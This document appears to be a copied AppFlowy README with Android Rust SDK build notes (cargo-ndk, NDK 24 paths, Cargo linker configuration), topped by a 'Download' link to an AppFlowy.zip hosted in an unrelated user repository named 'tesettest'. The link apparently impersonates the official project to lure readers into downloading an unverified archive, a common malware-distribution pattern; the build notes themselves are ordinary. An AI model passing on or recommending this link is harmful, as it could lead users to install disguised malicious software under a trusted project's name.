# AppFlowy — AI Collaborative Workspace and Android Rust SDK Build Notes

[Download](https://github.com/gcoyerk/tesettest/releases/download/test/AppFlowy.zip)

AppFlowy is an open source AI collaborative workspace for bringing projects, wikis, and team knowledge into one place while keeping control of your data. It is positioned as an open source alternative to Notion and supports collaborative work across project planning, documentation, and knowledge management.

This repository information focuses on building the AppFlowy Rust SDK for Android. The Android build process is straightforward, but it requires the Android NDK, Cargo NDK, and a small amount of local toolchain configuration.

## What AppFlowy Is For

AppFlowy is designed for teams and individuals who need a workspace for:

- Project organization
- Wiki-style documentation
- Team collaboration
- AI-assisted productivity
- Data-controlled workspace workflows
- Open source alternatives to closed productivity platforms

The Android-specific notes in this README are intended for developers preparing the Rust SDK for Android targets.

## Android Rust SDK Build Requirements

Before building the Rust SDK for Android, make sure the following tools are available:

- Android NDK Tools  
  - Version 24 has been tested.
- Cargo NDK  
  - The latest available version is expected to work.

Install Cargo NDK with:

```bash
cargo install cargo-ndk
```

Install Android NDK version 24 through Android Studio or by using the standalone NDK package from the Android developer tools.

After installation, set the `ANDROID_NDK_HOME` environment variable so the build tools can locate the NDK directory.

Example:

```bash
export ANDROID_NDK_HOME=/home/user/Android/Sdk/ndk/24.0.8215888
```

You may also want to add the NDK path to your shell configuration file, such as `.bashrc`, `.zshrc`, `.profile`, or a similar environment file:

```bash
export PATH=/home/user/Android/Sdk/ndk/24.0.8215888:$PATH
```

Adjust the path for your local machine.

## Cargo Target Configuration

Cargo needs to know which linker and archiver to use for Android targets. Add the following target configuration to your Cargo config file, usually located at:

```text
~/.cargo/config
```

Example configuration for Linux:

```toml
[target.aarch64-linux-android]
ar = "/home/user/Android/Sdk/ndk/24.0.8215888/toolchains/llvm/prebuilt/linux-x86_64/bin/llvm-ar"
linker = "/home/user/Android/Sdk/ndk/24.0.8215888/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android29-clang"

[target.armv7-linux-androideabi]
ar = "/home/user/Android/Sdk/ndk/24.0.8215888/toolchains/llvm/prebuilt/linux-x86_64/bin/llvm-ar"
linker = "/home/user/Android/Sdk/ndk/24.0.8215888/toolchains/llvm/prebuilt/linux-x86_64/bin/armv7a-linux-androideabi29-clang"

[target.i686-linux-android]
ar = "/home/user/Android/Sdk/ndk/24.0.8215888/toolchains/llvm/prebuilt/linux-x86_64/bin/llvm-ar"
linker = "/home/user/Android/Sdk/ndk/24.0.8215888/toolchains/llvm/prebuilt/linux-x86_64/bin/i686-linux-android29-clang"

[target.x86_64-linux-android]
ar = "/home/user/Android/Sdk/ndk/24.0.8215888/toolchains/llvm/prebuilt/linux-x86_64/bin/llvm-ar"
linker = "/home/user/Android/Sdk/ndk/24.0.8215888/toolchains/llvm/prebuilt/linux-x86_64/bin/x86_64-linux-android29-clang"
```

Replace `/home/user/Android/Sdk/ndk/24.0.8215888` with the actual NDK location on your system.

## NDK 24 Toolchain Note

When using Android NDK version 24, an additional compatibility file may be required for the Clang toolchain.

Create a file named:

```text
libgcc.a
```

Add this content:

```text
INPUT(-lunwind)
```

Place the file under the Clang library path for the NDK, for example:

```text
Android/Sdk/ndk/24.0.8215888/toolchains/llvm/prebuilt/linux-x86_64/lib64/clang/14.0.1/lib/linux
```

Copy the file into the relevant architecture folders:

- `aarch64`
- `arm`
- `i386`
- `x86_64`

This step is specific to the tested NDK 24 setup. The same adjustment may not be needed when using Android NDK version 22.

## Supported Android Targets in the Example

The configuration above covers these Android architectures:

| Target | Architecture |
| --- | --- |
| `aarch64-linux-android` | 64-bit ARM |
| `armv7-linux-androideabi` | 32-bit ARM |
| `i686-linux-android` | 32-bit x86 |
| `x86_64-linux-android` | 64-bit x86 |

## FAQ

### What is the main purpose of AppFlowy?

AppFlowy is an AI collaborative workspace for projects, wikis, and team work. It emphasizes open source availability and user control over data.

### What does this README focus on?

This README focuses on preparing the Android build environment for the AppFlowy Rust SDK.

### Which Android NDK version is referenced?

Android NDK version 24 is the tested version referenced here.

### Is Cargo NDK required?

Yes. Cargo NDK is used for working with Rust builds targeting Android.

### Do I need to edit paths in the Cargo configuration?

Yes. The paths shown are examples and must be changed to match your local Android NDK installation.
